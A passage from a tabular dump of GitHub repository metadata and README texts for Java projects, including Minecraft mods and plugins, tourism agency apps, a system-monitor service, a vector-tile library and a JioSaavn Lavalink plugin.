- DSM: Implemented the TicTacToe solver based on a website. Likely similar to DSM.
- SBC: MIT Licensed with different cosmetic code and acquirement methods.
- Patcher: Constant values taken directly from game versions, code is different.
- NEU: Custom skull re-texturing functionalities are different.
- Crash Debugging: Implemented in a standard way.

Is SBE Against the EULA?
No, selling mods is not prohibited by the Minecraft EULA. Commercial Guidelines specify allowed commercial activities, including selling mods.

### Features

General:
- Edit Gui
- Make all Elements Default
- Make all Elements Shadowed
- Gui Display
- Show Only in Skyblock
- Edit Menu Theme
- Show Error Messages

Cosmetics:
- Custom Color Names
- Show Own Custom Color
- Show Particle Cosmetics
- Show Particles in First Person

- Commands
- Customize Custom Commands
- Show Networth in Player Cmd

WIP
- Revert Master Stars
- Color Blaze Slayer Mobs
- Blaze Pillar Warning
- Show Attunement Display
- ...

Notifications
- Copy Rare Fishes
- Announce Rare Drops
- Copy Rare Drops
- Dark Auction Warning
- ...

Miscellaneous
- Timestamps
- Show Milestones
- Show NPC Sell Price
- Show Auction Data
- Show Auction Data Everywhere
- ...

Experimentation
- Experimentation Helper
- First Experimentation Color
- Second Experimentation Color
- Third Experimentation Color
- ...

Rarity Colors
- Render Item Rarities
- Render Rarities Everywhere
- Render Rarities In Hotbar
- Rarity Color Alpha
- Rarity Type
- ...

Dwarven Mines
- Show Mine Map
- Notify Events
- Mute Wind Changes
- Raffle Time Warning
- Gourmand Time Warning
- ...

Crystal Hollows
- Show Hollows Map
- Show Enabled / Disabled Perks
- Show Blocks Walked
- Show Gemstone Buffs
- ...

Spider's Den
- Show Spider Den Waypoints
- Edit Den Waypoints
- Reset Den Waypoints
- Show Arachne HP
- Show Arachne Counter
- ...

Farming Island
- Treasure Hunter Solver

End Island
- Show Soul Flow Display
- Show Final Destination Display
- Show Excess Mana
- Merge Excess Mana
- ...

Etherwarp Display
- LOS Etherwarp Location
- Etherwarp Targeted Block
- Display Unuseable Blocks

Trackers
General
- Start Session
- Stop Session

Slayer
- Show Slayer Counter
- Edit Slayer Counter
- Auto Select Slayer
- Reset Counter on Restart
- ...

Fishing
- Show Fishing Counter
- Show General Counter
- Toggle Winter Counter
- Toggle Shark Counter
- ...
etc.
",The best qol mod for hypixel skyblock,"minecraft,minecraft-mod,sbe,skyblock-extras,skytils,skytils-mod",2024-04-20T19:11:42Z,2024-04-20T19:10:39Z,2024-04-20T19:10:39Z,1,1,0,2,0,13,14,1,0,Apache-2.0,Java
kp7742/RootOverlay,main,"# RootOverlay
 Draw on Canvas based Overlay with RootService

## Credits
- [libSU-RootServices](https://github.com/topjohnwu/libsu)
- [ImGuiJniRoot](https://github.com/PShocker/ImGuiJniRoot/tree/master)",Draw on Canvas based Overlay with RootService,,2024-04-13T11:10:05Z,2024-04-13T11:10:00Z,,0,1,0,2,2,1,14,1,0,GPL-3.0,Java
Xyness/SimpleClaimSystem,main,"# SimpleClaimSystem
SimpleClaimSystem is a plugin allowing you to protect your constructions, it works with chunks. The claims are fully configurable (settings, members, bans, name, description, chunks, sales..).

## Compatibility
|                      Software                       |    Version    |
|:---------------------------------------------------:|:-------------:|
|    [PaperMC](https://papermc.io/downloads/paper)    |     1.18+     |
|           [Purpur](https://purpurmc.org)            |     1.18+     |
|     [Folia](https://papermc.io/software/folia)      |     1.18+     |
|         [Spigot](https://www.spigotmc.org)          |     1.18+     |


## Support
|        Plugin        |     Link     |
|:--------------------:|:------------:|
| PlaceholderAPI       | [Download](https://www.spigotmc.org/resources/placeholderapi.6245/)    |
| GriefPrevention      | [Download](https://www.spigotmc.org/resources/griefprevention.1884/)    |
| Vault                | [Download](https://www.spigotmc.org/resources/vault.34315/)    |
| Dynmap               | [Download](https://www.spigotmc.org/resources/dynmap.274/)    |
| Bluemap              | [Download](https://bluemap.bluecolored.de/)    |
| Pl3xmap              | [Download](https://modrinth.com/mod/pl3xmap)    |


## Useful links
### - Wiki ([here](https://xyness.gitbook.io/simpleclaimsystem))
### - Discord ([here](https://discord.gg/xyness))


## bStats
[![](https://bstats.org/signatures/bukkit/SimpleCLaimSystem.svg)]([https://bstats.org/plugin/bukkit/SimpleClaimSystem/21435](https://bstats.org/plugin/bukkit/SimpleClaimSystem/21435))
","Minecraft plugin, claim system for servers",,2024-04-02T21:33:13Z,2024-09-22T22:41:21Z,2024-09-22T22:41:21Z,23,1,0,152,1,3,14,1,1,NOASSERTION,Java
CrazyDevo/playwright-with-java,master,,,,2024-04-20T21:10:44Z,2024-04-28T19:50:44Z,,0,1,0,13,0,10,14,1,0,,Java
Devlrxxh/Neptune,master,"# Neptune | 1.20 Practice Core

![pfp](https://github.com/Devlrxxh/Neptune/assets/125221056/c9ec6441-34c8-472e-9fe3-1bd20a3b31db)

📖**Features:**  
• Arena System (Shared, Standalone)  
• Kit System (Boxing, Crystal, Axe, etc.)  
• Kit Editor with Inventories  
• View match System  
• Queue Ping Range System (Soon)  
• Animated Scoreboard System  
• Placeholder API (Compatibility)  
• All hotbars items configurable  
• All messages configurable  
• Advanced Arena system  
• Player Statistics  
• Player Particle Death Effects (Soon)  
• Nearly everything is customizable (Menus, scoreboard, etc.)  
• Easy to use managment menus

📎**Requirements:**  
• (Optional) FastAsyncWorldEdit  
• Mongo Database

🖼️**Media:**
![image](https://github.com/Devlrxxh/Neptune/assets/125221056/6e0d63dd-f0f0-4165-ac0e-1b7d6f66f588)
![image](https://github.com/Devlrxxh/Neptune/assets/125221056/bad14a9b-b742-45e1-923a-0317cd07d37e)
![image](https://github.com/Devlrxxh/Neptune/assets/125221056/f60d56fc-1b24-478b-9ccc-4ab2711f4b42)
![image](https://github.com/Devlrxxh/Neptune/assets/125221056/86281423-a371-44fe-a13b-3a86a8dd150b)
![image](https://github.com/Devlrxxh/Neptune/assets/125221056/ee05f045-a03a-4fce-9c54-6849107e0ecb)
![image](https://github.com/Devlrxxh/Neptune/assets/125221056/9957b2a0-8292-4cb3-9e80-ca7c8442a70c)
![image](https://github.com/Devlrxxh/Neptune/assets/125221056/cd7adf54-f4b3-425c-add5-99cad13b6174)
![image](https://github.com/Devlrxxh/Neptune/assets/125221056/f2b0436a-3d37-47b1-839b-588ead692227)

🖥️**Test Server:**
IP: aegis.rip
",1.16 -  1.21 Practice core which offers tons of premium features for free!,"minecraft,practice,minecraft-plugin,minecraft-pvp,plugin-development,minecraft-practice,pvp",2024-04-09T21:05:41Z,2024-09-24T11:17:57Z,2024-09-22T08:01:03Z,14,4,9,293,1,2,14,1,0,GPL-3.0,Java
Runadee/TourismAgency,main,"# Tourism Agency System


#Video Project Link
You can watch my project. Click to Link.

https://youtu.be/4grOs1eUtlg?si=3fCR9HvuSjSnii4i

## Java, Java Swing

The working logic of a tourism agency is as follows: Hotels reserve specific rooms for the Patika Tourism Agency and wait for the agency to sell these rooms. The agency, when selling these rooms, adds its service fee on top, either as a percentage or a fixed amount, and sells them to customers.

The agency believes that handling these tasks on paper and manually is a waste of time and seeks a software solution to streamline its operations.

### Agency's Expectations from the Software:

#### Hotel Management
The agency should be able to manage hotels with their location information and other details within the system. When adding a hotel, various parameters such as Hotel Name, Address, Email, Phone, Stars, Facility Features, and Board Types are defined.

Historical periods for hotels are added, and pricing is determined based on these periods. The goal here is to provide variable pricing. For instance, hotel prices are higher during summer months compared to lower rates in winter. Pricing in the tourism sector is done seasonally. Seasons are defined as date ranges.

---


<img width=""353"" alt=""Ekran Resmi 2024-04-03 10 31 20"" src=""https://github.com/Runadee/TourismAgency/assets/134780868/35c4eaf6-0eaf-4c94-8eb2-2ff890acc100"">
<img width=""804"" alt=""Ekran Resmi 2024-04-03 10 36 24"" src=""https://github.com/Runadee/TourismAgency/assets/134780868/74acdf7b-c505-4a64-9d41-a321c9363671"">
<img width=""1303"" alt=""Ekran Resmi 2024-04-03 10 37 25"" src=""https://github.com/Runadee/TourismAgency/assets/134780868/2f0941a9-8908-4c66-b42c-cfdf583c4ead"">
<img width=""1303"" alt=""Ekran Resmi 2024-04-03 10 38 03"" src=""https://github.com/Runadee/TourismAgency/assets/134780868/29170364-aa9c-48af-8372-83018f40255e"">
<img width=""1303"" alt=""Ekran Resmi 2024-04-03 10 38 41"" src=""https://github.com/Runadee/TourismAgency/assets/134780868/ea9b46f5-6f00-44b6-8d20-ee1118738e3b"">
",,,2024-04-02T11:07:57Z,2024-04-18T21:23:44Z,,0,2,0,14,1,0,14,1,0,,Java
debanjo31/backsnip,main,,"Backsnip contains a collection of pre-written solutions for common backend development tasks, covering various programming languages and frameworks. The goal is to provide a centralized resource for developers to find and reuse solutions, promoting efficiency and collaboration..",,2024-04-28T19:28:46Z,2024-09-11T16:52:23Z,,0,5,9,46,0,9,14,1,0,MIT,Java
teachingai/spring-ai-examples,main,"# spring-ai-examples


",Spring AI Examples,"openai,pangu,springai",2024-04-06T04:00:14Z,2024-09-17T14:04:57Z,,0,1,1,88,0,4,14,2,0,,Java
retoocs007/JavaSysMonitor,main,"# JavaSysMonitor
Small Java SpringBoot REST API service that collects system info.

This is created for personal use with Homepage Custom API widget.

>  https://gethomepage.dev/latest/widgets/services/customapi/


Example how it looks - three large boxes named PROXVM-SRV:
![Proxmox Custom API widgets](https://preview.redd.it/my-homepage-dashbord-with-few-services-and-custom-written-v0-bcqtb2xcxrxc1.jpeg?width=1080&crop=smart&auto=webp&s=573a41d3f9e26c1a5acbb302b5c624378481e580 ""Proxmox Custom API widgets"")


### Requirements for building:
 - Java 17
 - Gradle 8.7
 - SpringBoot 3.2.5

### Requirements for running:
 - Java 17
 - df package on Linux for getting disk info

### Endpoints
>  ```metrics``` - http://IP_ADDRESS:9314/metrics

>  Optional parameter ```id``` - http://IP_ADDRESS:9314/metrics?id=test

This endpoint returns:
 - cpuLoad
 - usedMemory
 - totalMemory
 - freeMemory
 - disks
   - name
   - totalSpace
   - freeSpace
 - osName
 - osVersion
 - osArch,
 - cpuName
 - mboName
 - upTime

Port can be changed in ```application.properties```.

Optional parameter ```id``` can be used to further separate and identify callers that are calling this endpoint.
It's not required, and it doesn't affect response.

Example response:

```
{
    ""cpuLoad"": ""0,00 %"",
    ""usedMemory"": ""7,45 GB"",
    ""totalMemory"": ""7,91 GB"",
    ""freeMemory"": ""0,46 GB"",
    ""disks"": [
        {
            ""name"": ""C:\\"",
            ""totalSpace"": ""222 GB"",
            ""freeSpace"": ""28 GB""
        },
        {
            ""name"": ""D:\\"",
            ""totalSpace"": ""0 GB"",
            ""freeSpace"": ""0 GB""
        }
    ],
    ""osName"": ""Microsoft Windows 10 build 19045"",
    ""osVersion"": ""10.0"",
    ""osArch"": ""amd64"",
    ""cpuName"": ""Intel(R) Core(TM) i3-6100 CPU @ 3.70GHz"",
    ""mboName"": ""Dell Inc. - OptiPlex 3040"",
    ""uptime"": ""00d:03h:11m:10s""
}
```

In the ```Homepage``` folder there is ```services.yaml``` example how to configure Custom API widget with this service.
Change IP and port accordingly.


### Running on Debian systems
Example how to run on Debian in the background:
> nohup java -jar JavaSysMonitor.war > JavaSysMonitor.log 2>&1 & 

Don't forget to rotate logs or restart service once in a while. Or if you don't need logging you can exclude that part
from the command:

> nohup java -jar JavaSysMonitor.war 2>&1 &

### Other
Potentially this service can be used for getting system information of other PCs (Windows, macOS (not tested), VMs) and display
it in Homepage.",Small Java SpringBoot REST API service that collects system info,,2024-05-01T19:26:02Z,2024-05-16T20:16:58Z,2024-05-16T20:16:58Z,7,1,0,29,1,3,13,1,1,GPL-3.0,Java
C0de-cake/airbnb-clone-backend,main,"# Airbnb clone (fullstack project) Spring boot 3, Angular 17, PrimeNG, PostgreSQL, Auth0 (2024) (Backend)

Spring boot backend of the airbnb clone

[Video tutorial](https://youtu.be/XriUV06Hkow)

[Angular Frontend](https://github.com/C0de-cake/airbnb-clone-frontend)

### Key Features:
- 📅 Booking management for travelers
- 🏠 Landlord reservation management
- 🔍 Search for houses by criteria (location, date, guests, beds, etc)
- 🔐 Authentication and Authorization (Role management) with Auth0 (OAuth2)
- 🏢 Domain-driven design

## Usage
### Prerequisites
- [JDK 21](https://adoptium.net/temurin/releases/)
- [PostgreSQL](https://www.postgresql.org/download/)
- IDE ([VSCode](https://code.visualstudio.com/download), [IntelliJ](https://www.jetbrains.com/idea/download/))

### Clone the repository
``git clone https://github.com/C0de-cake/airbnb-clone-back``

### Launch
#### Maven
``./mvnw spring-boot:run  -Dspring-boot.run.arguments=""--AUTH0_CLIENT_ID=<client-id> --AUTH0_CLIENT_SECRET=<client-secret>""``

#### IntelliJ
Go in IntelliJ add the environment variables and then run it.
",,,2024-04-23T22:06:33Z,2024-06-29T23:17:40Z,,0,1,0,12,0,10,13,2,0,,Java
geoatlas-cloud/geo-atlas,main,"# Geo Atlas

## 介绍

[Geo Atlas](https://github.com/geoatlas-cloud/geo-atlas)，译为地理地图册(地理地图集)，就像小时候买到的纸质的地理地图册书本，里面填充着各式各样的地图。所以, 我也希望有那么一个东西，同样可以对外提供各种各样的地图以供使用。

目前来说，他还只是一个基于Java的开发的，可用于快速构建矢量切片服务的基础库。

> 本例中基于Geo Atlas实现了一个精简版本的矢量切片服务，从结果来看，可以将其看作为仅实现了矢量切片功能的GeoServer的精简提升版本。

## 背景和动机

首先，我是一个主做服务端开发的GIS开发工程师，平时接触最多的就是管网地图服务发布。此前的工作中没有使用任何平台技术，比如：ArcGIS、超图等，而是使用开源技术。技术栈大体可以总结为：SpringBoot + GeoServer + Mapbox + 空间数据库。

其次，目前在业务应用上，二维地图还是主流。而二维地图技术里面，属Mapbox Vector Tile的体验最好。所以，目前的技术路线是通过 GeoServer 来发布Vector Tile。

然后，在 GeoServer 使用中，我发现了这个几个问题：

- 受限于其开源协议（GPL 2.0）的约束，你无法通过修改部分源代码的方式，将其直接集成到系统内部。只能是单独部署，通过其提供的REST接口进行交互。基于此，部署方式同样受限。
- GeoServer 是一个大而全的东西，同时他是一个单体项目。也就是说，哪怕我只需要提供MWTS+MVT服务，我也需要部署一个全功能的节点，无法按需使用（这里不得不提一下GeoServer Cloud项目，但是它提出得要求更多了，需要一套微服务的环境）
- 从公谨[《WebGIS数据不切片或是时代必然》](https://zhuanlan.zhihu.com/p/512298212)一文推论，GeoServer中提供的MVT技术（指数据切片过程）已经算是切片起源时代的产物了，而今已经跨过了矢量切片时代（数据还是预切），进入了动态矢量切片时代了
- GeoServer中Vector Tile与GeoWebcache中的Tile Meta技术有冲突，瓦片清理存在BUG。可以理解为，GeoServer对于矢量瓦片的支持并不是很好。
- 不能很好的处理瓦片缓存与动态业务数据的矛盾，即使GeoWebcache提供缓存清理的策略。（Layer中Boundingbox范围问题）

> GeoServer完全是栅格金字塔技术的实现，不过是将栅格金字塔技术同时应用在栅格数据和矢量数据上，同时他并没有很好的针对不同层级对数据进行抽稀简化（其尝试从服务端配图SLD中获取数据分级规则，我没有测试过，但反对，理由参见: [关于矢量瓦片技术支持前端渲染带来的思考](https://fuyi-atlas.github.io/posts/gis/thoughts-on-mvt-front-end-rendering/)），那么就出现了一个pbf有近20M的情况。同时也回答了为什么现在大家都直接在数据库层面实现矢量瓦片（或者说是在数据源中），一是可以无视数据传递的时间损耗；二是可以直接做抽稀简化，这样出去的数据少了，传输速度自然也快了；三是数据库空间支持已经很成熟了；四是门槛高啊（护城河）

最后，我也想对我目前的状态做一次总结。那么，Geo Atlas应该就是我最好的总结方式。因为它既可以丰富我的简历🫣，又可以帮助我绘制技能树，完成这一次的总结。

---

ps: 当然，还有当下信创的背景原因。就当，抛砖引玉了😧，哈哈哈😬

## 状态

不定期更新...

## 特性

- [x] 遵循 [OGC Two Dimensional Tile Matrix Set and Tile Set Metadata Standard 2.0](https://docs.ogc.org/is/17-083r4/17-083r4.html) [并不完全遵循]
- [ ] 尝试遵循 [NEW OGC API](https://ogcapi.ogc.org/#standards)
- [x] 提供矢量切片能力
- [x] 支持自定义数据属性分级规则
- [x] 支持Google瓦片坐标系(原点在左上角, 默认即为Google瓦片坐标系)
- [x] 支持3857(900913), 4490投影(即默认提供相应的TileMatrixSet)
- [ ] 支持自定义坐标系及自定义坐标转换行为(源数据坐标系)
- [x] 支持自定义数据范围(OGC TileMatrixSet Limits，拒绝范围外请求)
- [x] 提供全局统一的，可快速集成的瓦片缓存组件， 
- [x] 支持基于内存和文件系统的缓存
- [ ] 支持使用GeoPackage进行缓存
- [x] 支持Seed, Reseed, Truncate三种瓦片缓存处理策略
- [x] 提供Namespace, Datastore, FeatureLayer元数据管理模块，并提供一个可视化操作界面(Geo Atlas Dashboard)
- [ ] 提供栅格数据切片能力
- [ ] 提供地形数据切片能力
- [x] 提供按需快速集成能力(将常用功能封装为各种stater)

## 截图

![geo-atlas-001](./docs/img/geo-atlas-001.png)
![geo-atlas-002](./docs/img/geo-atlas-002.png)
![geo-atlas-cover-pic](./docs/img/geo-atlas-cover-pic.png)
![geo-atlas-003](./docs/img/geo-atlas-003.png)
![geo-atlas-004](./docs/img/geo-atlas-004.png)
![geo-atlas-005](./docs/img/geo-atlas-005.png)
![geo-atlas-006](./docs/img/geo-atlas-006.png)
![geo-atlas-007](./docs/img/geo-atlas-007.png)

## 快速开始

以下说明旨在基于Docker技术快速搭建一个矢量切片服务示例。

- Geospatial Data Source(With some data)
  ![境界与政区数据](./docs/img/china_bounds_data_structure.png)
  > 💡 <font style=""color:red"">提供下载的是矢量数据，不是最终地图，与符号化后的地图再可视化表达上存在一定差异。用户利用此数据编制地图，应当严格执行《地图管理条例》有关规定；编制的地图如需向社会公开的，还应当依法履行地图审核程序。</font>

  > 💡 <font style=""color:orange""> 数据仅供学习研究使用</font>
- Tiles API Service(Backend)
- Geo Atlas Dashboard(Frontend)

> 请确保你已经安装好了Java, Maven, Docker以及Docker Compose。
> 我测试使用Wsl2(Windows11) + Docker Desktop(4.30.0) + Apache Maven 3.8.7 + Oracle jdk 11.0.20

1. 克隆代码
    ```shell
    git clone --recursive https://github.com/geoatlas-cloud/geo-atlas.git
    cd geo-atlas/
    ```
2. 配置环境变量
    ```shell
    cp .env.production.local.template .env.production.local
    ```
   然后手动修改配置文件, 将其中的配置项修改为你自己的配置，如:

   - HOST_IP：宿主机IP
   - POSTGRES_PASSWORD：PostgreSQL数据库初始化密码
   - JASYPT_ENCRYPTOR_PASSWORD：用于加密数据库账户信息的密钥
   - CACHE_ENABLED：是否开启缓存
   - NEXT_PUBLIC_BASE_MAP_TYPE：地图类型, osm|tianditu
   - NEXT_PUBLIC_BASE_MAP_TILE_KEY：当使用天地图时需要填写key，4490经纬度投影默认使用天地图，如果需要进行4490经纬度投影预览还请填写天地图Key
   
3. 执行构建脚本, 拉起服务

    ```shell
    chmod +x ./build2run.sh
    ./build2run.sh
    ```
等待服务启动完成后访问: http://localhost:11003, 而后按照GeoServer的使用习惯, 逐步创建
- namespace
- datastore
- feature layer
可通过预览的方式检查瓦片服务是否正常

> 默认给出的数据为我国的境界与政区数据, 来自[省市县数据CTAmap](https://www.shengshixian.com/), 源自[1：100万公众版基础地理信息数据（2021）](https://www.webmap.cn/commres.do?method=result100W)
> 其实我也曾提取过境界与政区数据([全国1:100万基础地理信息数据-境界与政区提取](https://fuyi-atlas.github.io/posts/program/micro-weather/006/)), 不过与上述数据相比而言比较粗糙, 后由于时间关系没有进行细化, 所以没有使用
> 
> 在提供境界与政区数据的同时, 还支持切换为[OSM China](https://hub.docker.com/repository/docker/threadzhou/ga-geospatial-osm-china/general)的数据。 OSM-China数据的处理过程大致为: 将源数据通过Osm2pgsql入库, 而后使用pg_dump制作转储文件, 并基于此转储文件制作PostGIS镜像, 在容器初始化的时候会自动恢复数据。
> 但是转储后的文件比较大, 导致镜像也比较大, 同时数据比较多导致恢复的时候比较慢。如果将其作为示例中的数据源的话, 那么三个服务全部启动完成耗时估计得有5分钟了, 所以并未将其作为默认得数据源。
> 
> 如果你想要使用OSM的数据测试, 可以将其作为额外的数据源进行连接, 这样就不会影响示例应用的初步体验了

### 指南

点击图片跳转B站

[![Geo Atlas Quickstart-封面](./docs/img/geo-atlas-cover-pic.png)](https://www.bilibili.com/video/BV1oAgSenEq5/?vd_source=a3d6ac851199bb1b577a99305af58486)

## 技术概览

基于GeoTools、GeoWebCache进行Geo Atlas构建，基于Spring Boot Framework对外提供快速集成能力。

- GeoTools提供矢量数据读取以及坐标转换能力
- 在此对GeoWebCache进行了拆分为两个部分：分别是金字塔(pyramid, 提供瓦片索引与瓦片生成能力)与瓦片缓存(tile-cache, 提供瓦片缓存能力)

> Mapbox Vector Tile Generator 由 [java-vector-tile](https://github.com/ElectronicChartCentre/java-vector-tile) 提供支持

### 系统架构概述

下图描述了系统的总体架构。

![系统架构图](./docs/img/geo_atlas_architecture_overview_diagram.svg)

> 此处更多的表达了内部结构与层次关系，无关部署

### 组件概述

- APP
  - Geo Atlas Dashboard: 可视化操作界面
  - Tiles API Application: 提供矢量切片服务的应用程序(同时支持Dashboard)

- Boot
  - Tiles API Boot Stater: 对Tiles API的快速集成封装, 约定大于配置

- Component
  - Metadata Mgmt: 提供Namespace, Datastore, FeatureLayer元数据管理模块
  - Tile Cache: 提供瓦片缓存能力, 目前支持基于内存, 文件系统两种缓存方式, 可任意组合
  - OGC APIS: 提供OGC APIs, 目前仅支持Tiles API

- Library
  - Base References: 基础依赖声明
  - Pyramid Model: 金字塔模型, 用于构建瓦片金字塔结构索引, 同时提供切片管道
  - Tile Generator: 瓦片生成器, 目前仅支持Mapbox Vector Tile Generator

- External Data Sources
  - Config Storage: 用于存储Namespace, Datastore, FeatureLayer等元数据
  - Geospatial Data Source: 用于存储矢量数据, 如PostGIS、SQLServer

## 构建

### Requirements:

- Java >= 1.8 JDK

- Maven >= 3.6.3?

- Docker version >= 19.03.3?

- docker-compose version >= 1.26.2?

我不能很好的把握Maven和Docker的版本, 我自己的开发环境如下:

- OS: Windows 11(已开启WSL 2)
- IDE: IntelliJ IDEA 2023.2.3
- JDK: Amazon Corretto 1.8.0_412 | Oracle jdk1.8.0_241
- Maven: Apache Maven 3.9.2(使用IDEA 自带的Maven)
- Docker Desktop: 4.30.0

### Build

1. 克隆代码
    ```shell
    git clone https://github.com/geoatlas-cloud/geo-atlas.git
    cd geo-atlas/
    ```
2. 要构建应用程序，请从根项目目录运行以下命令, 或者使用IDEA的Maven插件

    ```shell
    mvn clean install -DskipTests
    ```

### Running

1. 配置环境变量, 默认使用dev环境(当然，你可以直接修改dev.yml文件, 而不是通过环境变量控制)

   ![开发环境 环境变量配置](./docs/img/tiles-api-app-dev-env-config.png)

2. 自行用IDEA打开项目，然后运行Application类。

## 支持
- thread.zhou@gmail.com
- thread_zhou@126.com

## 声明与致谢

- Geo Atlas现版本参照[GeoServer](https://github.com/geoserver/geoserver)应用模式构建，并参考了[GeoServer](https://github.com/geoserver/geoserver)以及[GeoServer Cloud](https://github.com/geoserver/geoserver-cloud)的实现方式
- Pyramid、IO(in Library)、Tile Cache模块均来自GeoWebCache, 是对其进行了拆解和少量变更
- 矢量数据的读取与坐标转换使用GeoTools
- Mapbox Vector Tile Generator由 [java-vector-tile](https://github.com/ElectronicChartCentre/java-vector-tile) 提供支持

## 版权许可
[LGPL-3.0 license](./LICENSE)

版权所有 (c) 2024-至今，Geo Atlas。
",用于构建矢量切片服务的 Java 基础库,"vector-tile,vector-tile-service",2024-05-01T05:10:54Z,2024-08-03T05:12:38Z,,0,1,0,52,0,4,13,1,0,LGPL-3.0,Java
appujet/jiosaavn-plugin,master,"# JioSaavn Plugin For Lavalink

- This is a plugin for [Lavalink](https://github.com/lavalink-devs/Lavalink)
- This plugin allows you to play songs from JioSaavn in your discord server.
- This plugin uses the [JioSaavn API](https://github.com/sumitkolhe/jiosaavn-api) to fetch songs.
- Special thanks to [topi314](https://github.com/topi314/LavaSrc) and [duncte123](https://github.com/duncte123) because most of the code for this plugin is based on [Lavasrc](https://github.com/topi314/LavaSrc) and [skybot-lavalink-plugin](https://github.com/DuncteBot/skybot-lavalink-plugin).

## Lavalink Usage
To install this plugin either download the latest release and place it into your plugins folder or add the following into your application.yml
Replace `VERSION` with the latest release version.

```yaml
lavalink:
  plugins:
    - dependency: ""com.github.appujet:jiosaavn-plugin:VERSION""
      repository: ""https://jitpack.io""
```

## Configuration

For all supported urls and queries see [here](#supported-urls-and-queries)

(YES `plugins` IS AT ROOT IN THE YAML)

```yaml
server: # REST and WS server
  port: 2333
  address: 0.0.0.0
lavalink:
# plugins would go here, but they are auto-loaded when developing
#  plugins:
#    - dependency: ""com.github.appujet:jiosaavn-plugin:VERSION""
#      repository: ""https://jitpack.io""
  server:
    password: ""youshallnotpass""
    sources:
      youtube: true
      bandcamp: true
      soundcloud: true
      twitch: true
      vimeo: true
      http: true
      local: false
    bufferDurationMs: 400 # The duration of the NAS buffer. Higher values fare better against longer GC pauses
    frameBufferDurationMs: 5000 # How many milliseconds of audio to keep buffered
    youtubePlaylistLoadLimit: 6 # Number of pages at 100 each
    playerUpdateInterval: 5 # How frequently to send player updates to clients, in seconds
    youtubeSearchEnabled: true
    soundcloudSearchEnabled: true
    gc-warnings: true
    #ratelimit:
      #ipBlocks: [""1.0.0.0/8"", ""...""] # list of ip blocks
      #excludedIps: [""..."", ""...""] # ips which should be explicit excluded from usage by lavalink
      #strategy: ""RotateOnBan"" # RotateOnBan | LoadBalance | NanoSwitch | RotatingNanoSwitch
      #searchTriggersFail: true # Whether a search 429 should trigger marking the ip as failing
      #retryLimit: -1 # -1 = use default lavaplayer value | 0 = infinity | >0 = retry will happen this numbers times

plugins:
  jiosaavn:
    apiURL: ""https://saavn.dev/api"" # JioSaavn API URL
metrics:
  prometheus:
    enabled: false
    endpoint: /metrics

sentry:
  dsn: """"
  environment: """"
#  tags:
#    some_key: some_value
#    another_key: another_value

logging:
  file:
    max-history: 30
    max-size: 1GB
  path: ./logs/

  level:
    root: INFO
    lavalink: INFO
```

## Advantages of Using JioSaavn

- No region-based content blocking (unlike Deezer and Yandex).
- A better alternative for playing mirrored audio sources not dependent on YouTube.
- Similar content library size as Spotify and Apple Music.
- Superior to Deezer as it doesn't require any decryption key and provides slightly higher bitrate audio than Deezer's 128KBPS MP3.

## Supported URLs and Queries

### JioSaavn

- `jssearch:animals architects` - Search for a song on JioSaavn.
- `jsrec:identifier` - Get a song recommendation based on the identifier.

- <https://www.jiosaavn.com/song/apna-bana-le/ATIfejZ9bWw>
- <https://www.jiosaavn.com/album/bhediya/wSM2AOubajk>_
- <https://www.jiosaavn.com/artist/arijit-singh-songs/LlRWpHzy3Hk>_
- <https://www.jiosaavn.com/featured/jai-hanuman/8GIEhrr8clSO0eMLZZxqsA>__

## How to get API URL ?

- You can host the api locally using [this guide](https://github.com/sumitkolhe/jiosaavn-api)

- You can easily deploy your own instance of the API by clicking the button below:

[![Deploy with Vercel](https://vercel.com/button)](https://vercel.com/new/clone?repository-url=https://github.com/sumitkolhe/jiosaavn-api)

> [!TIP]
> To ensure the API provides results in the intended language, configure the [Serverless Function Region](https://vercel.com/docs/concepts/functions/serverless-functions/regions) in Vercel to `Mumbai, India (South) - > bom1`.
",,"lavalink,lavalink-client,lavalink-musicbot,lavalink-plugin,lavaplayer",2024-04-27T07:03:53Z,2024-08-07T12:26:23Z,2024-08-07T12:26:23Z,12,2,1,25,0,5,13,1,2,,Java
halilibrahimsaltas/TourismAgency,master,"
# Tourism Agency

#### Purpose 

The main purpose of this project is to enable the company operating in the hotel sector to manage its daily operations more effectively and to optimize customer reservation processes.

Patika Tourism Agency makes agreements with many hotels and reserves hotel rooms for customers. The first person with admin authority from the agency will be recorded in the database by the software developer. The person with admin authority will also be able to log in to the system and add both admin and agency employees. Agency employees will register hotels and rooms in the system, search for rooms and make reservations according to customers' demands.

Hotel Management System aims to achieve these goals by offering features such as flexible pricing, detailed hotel and room management, ease of reservation and automatic calculation to agency employees with a user-friendly interface.

The agency thinks that doing these tasks manually and on paper is a waste of time, and it needs software that will make its job easier.

#### Patika + | Tourism Agency Management Project Video Link:
https://www.youtube.com/watch?v=vKMdBdOzGSQ&ab_channel=Halil%C4%B0brahimSALTA%C5%9E

### Screenshots
![entery-0](https://github.com/halilibrahimsaltas/TourismAgency/assets/82754847/4ccb0846-e065-4b32-a0f8-7281fc6b7dbc)
![entery](https://github.com/halilibrahimsaltas/TourismAgency/assets/82754847/81a50d43-3f44-4df2-84d6-d1c99898b208)
![user add](https://github.com/halilibrahimsaltas/TourismAgency/assets/82754847/f886c6c5-01b9-4cb3-a98e-a5aa61e5a13f)
![otel](https://github.com/halilibrahimsaltas/TourismAgency/assets/82754847/859ad5a8-0c00-4df8-84b7-76f9b58afedd)
![otel add](https://github.com/halilibrahimsaltas/TourismAgency/assets/82754847/38fb44e9-3ae1-49a7-bc04-8ab095e9798e)
![season](https://github.com/halilibrahimsaltas/TourismAgency/assets/82754847/7b0ff27b-e01b-40d9-81e3-44136c9b412a)
![pension](https://github.com/halilibrahimsaltas/TourismAgency/assets/82754847/9f4d104e-4e4b-4c73-adbc-d74e19a7f726)
![room](https://github.com/halilibrahimsaltas/TourismAgency/assets/82754847/efe60788-8502-4565-96c6-693c1e8dfcbf)
![Room add](https://github.com/halilibrahimsaltas/TourismAgency/assets/82754847/a639c601-7581-4c4a-a845-ce5606204904)
![resevation](https://github.com/halilibrahimsaltas/TourismAgency/assets/82754847/5f112df8-6b03-4e9c-8370-8681ab8861f1)
![resevation add](https://github.com/halilibrahimsaltas/TourismAgency/assets/82754847/50db8e1a-9250-46fe-bb0e-0485c0adc0c9)
![resevation2](https://github.com/halilibrahimsaltas/TourismAgency/assets/82754847/86ae5b68-a25b-4e5f-82b7-c441467990e8)





## Requirements

-JDK Version is minimum JDK8.
",,,2024-04-13T07:54:13Z,2024-04-24T18:31:35Z,,0,2,0,16,0,0,13,1,0,,Java
